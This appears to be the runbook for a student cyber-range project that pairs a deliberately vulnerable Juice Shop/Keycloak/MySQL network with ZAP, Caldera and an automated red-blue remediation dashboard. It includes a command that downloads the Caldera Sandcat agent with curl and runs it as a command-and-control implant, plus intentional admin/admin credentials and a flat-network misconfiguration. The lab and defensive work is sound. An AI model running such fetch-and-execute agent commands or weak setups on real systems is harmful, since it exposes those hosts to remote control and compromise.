# AEGIS Midsem Runbook

## Current State

The range is split into three zones:
- `dmz_net`: Juice Shop and ZAP
- `corp_net`: the `employee` workstation, Keycloak (IdP, realm `aegis`), and the back side of Juice Shop
- `data_net`: MySQL. The workstation is also attached here on purpose, as a flat-network misconfiguration.

The dashboard (`python -m aegis serve`) collects inventory, identities, ZAP and
Caldera reports, and validated scenarios into a temporal attack graph. It ranks
attack paths and lists findings with their reachability. MITRE Caldera is an
optional Compose profile, because rootless Podman may not be able to unpack the
official Caldera image without host UID/GID configuration changes.

## Start the Range

From `cyber_range/`:

```bash
docker compose up --build
```

Expected local services:

- Juice Shop: `http://localhost:8080`
- Keycloak: `http://localhost:8180` (lab admin `admin` / `admin`; this weak bootstrap secret is deliberate and shows up as an attack path)
- AEGIS dashboard: `http://localhost:8000`

ZAP runs inside the range for scans and does not expose a browser UI by default.

## ZAP Scan

Run this after `webapp` and `zap` are healthy:

```bash
docker exec zap zap-full-scan.py -t http://webapp:3000 -J zap-scan-SC-series.json
```

Click **Re-collect** on the dashboard (or `POST /api/collect`). `/zap/wrk` is mounted to `experiments/results`, so the
JSON report is written directly into the dashboard's input directory. The
newest `experiments/results/*zap*.json` is authoritative: alerts missing from a
rescan are closed in the temporal graph.

## Caldera Operation

Caldera is optional for the midsem demo path. To start it with Docker Engine or
a Podman setup that can unpack the official image:

```bash
docker compose --profile caldera up -d caldera
```

Then open `http://localhost:8888`.

If rootless Podman fails with an error about insufficient UIDs/GIDs, fix the host
Podman user namespace configuration (`/etc/subuid`, `/etc/subgid`, then
`podman system migrate`) or run this service with Docker Engine. The official
GHCR Caldera image can contain file ownership values that rootless Podman cannot
map on some machines.

Start Sandcat from the `employee` container:

```bash
docker exec -it employee bash -lc "curl -s -X POST http://caldera:8888/file/download -H 'file:sandcat.go' -H 'platform:linux' -o sandcat && chmod +x sandcat && ./sandcat -server http://caldera:8888 -group red"
```

In Caldera, run a safe discovery ability such as System Information Discovery
(`T1082`) against the `red` group. Export the operation report as JSON and save
it to:

```text
experiments/results/caldera-op-SC-series.json
```

The dashboard ingests Caldera reports when the filename contains `caldera`.

## Dashboard API

Without containers, run it from the repo root (see README for setup):

```bash
.venv/bin/python -m aegis serve
```

See the README for the full endpoint list. Pick an earlier time in **Graph as of**
on the dashboard to view the graph and paths as they were then.

## Red-Blue Loop (Phases 2-3)

Run one safety-gated engagement over the current graph:

```bash
.venv/bin/python -m aegis engage
```

Or from the dashboard, click **Run red-blue loop**. Each validated attack shows its detection status, the environment
it ran in, its blast radius, and the proposed fixes with predicted impact, rollback, and a proof result (the attack
re-run after the fix, plus regression checks).

### Safety controls

- Authorized scope lives in `policy.yaml` (default deny). Anything off the allow-list is blocked by the safety agent.
- Kill switch: `POST /api/kill-switch?engage=true`, or create the file `var/KILL_SWITCH`. While engaged, every action
  fails closed. Reset with `engage=false` or delete the file.
- Evidence ledger: `var/ledger.jsonl`, hash-chained and append-only. Verify with `GET /api/ledger/verify`.

### Applying a proven fix for real

The proof engine shows a fix will close the path before you touch anything. To apply it to the live range:

- **Segmentation**: remove the host from the network in `docker-compose.yml`, then `docker compose up -d`.
- **Rotate secret**: change the value in the service environment / secrets manager and restart the service.
- **WAF virtual patch**: put a ModSecurity reverse proxy in front of the web app.
- **Identity hygiene**: clear the cached session / tighten the role in Keycloak.

Then click **Re-collect**: the closed path disappears from the graph, and the `before`/`after` exposure drop is
visible in the timeline.

## Pilot metrics and adaptive campaign (Phases 4-5)

**Pilot metrics (Phase 4).** Measure the Success Metrics and score them against pilot targets:

```bash
.venv/bin/python -m aegis pilot            # prints the executive report
.venv/bin/python -m aegis pilot --json     # full metrics JSON
```

Or from the dashboard, click **Measure pilot metrics**. The loop is run several times to prove the numbers are
repeatable (the engagement is deterministic, so repeatability is 100%). `POST /api/pilot` returns the same data plus
the Markdown executive report for export. The measurement uses an in-memory ledger, so it leaves the real ledger
untouched.

**Adaptive campaign (Phase 5).** Run multiple rounds of red-blue co-adaptation with tiered auto-remediation:

```bash
.venv/bin/python -m aegis campaign --rounds 5
```

Or click **Run adaptive campaign**. Each round: the learned planner picks paths, the blue agent proves fixes, the
low-risk tiers auto-apply (higher tiers are staged), and the next round re-plans against the smaller graph. The panel
shows the exposure trajectory falling round over round, how many fixes were auto-applied vs staged, resolved
conflicts, and any reopened paths (FR-27). Campaign evidence is written to the real hash-chained ledger
(`GET /api/ledger/verify` to check integrity).

## Broader coverage and the control compiler (Phases 6-7)

**Broader coverage (Phase 6).** Example cloud / Kubernetes / OT exports live in `cyber_range/coverage/`
(`cloud-estate.json`, `k8s-cluster.json`, `ot-assets.json`) and are ingested automatically on `collect`. With them
enabled the dashboard's attack paths and findings span on-prem, cloud, Kubernetes and OT, and the crown-jewel
objectives include the cloud order database, the payments database and the field PLC. These assets are authorized in
`policy.yaml`. To run the range without them, set `AEGIS_COVERAGE_DIR` to a directory with no `cloud-*/k8s-*/ot-*`
files. To edit or add coverage, drop another export in that directory (same JSON shape) and re-collect.

**Cross-tool control compiler (Phase 7).** Compile every proven fix into concrete per-tool controls plus a change
ticket and CMDB record:

```bash
.venv/bin/python -m aegis compile --top-paths 40
```

Or click **Compile controls** on the dashboard. Each proven fix is rendered as the actual rule / manifest / command
for the right platform (AWS security group, Kubernetes NetworkPolicy, OT protocol gateway, iptables, ModSecurity,
Vault rotation, RBAC, plus a SIEM detection), with a rollback. To print the change ticket for one fix as Markdown:

```bash
.venv/bin/python -m aegis compile --ticket <CHG-id>
```

Nothing is pushed to a live system: the compiler produces the reviewable change set that a human (or the low-risk
auto-remediation gate) then applies.
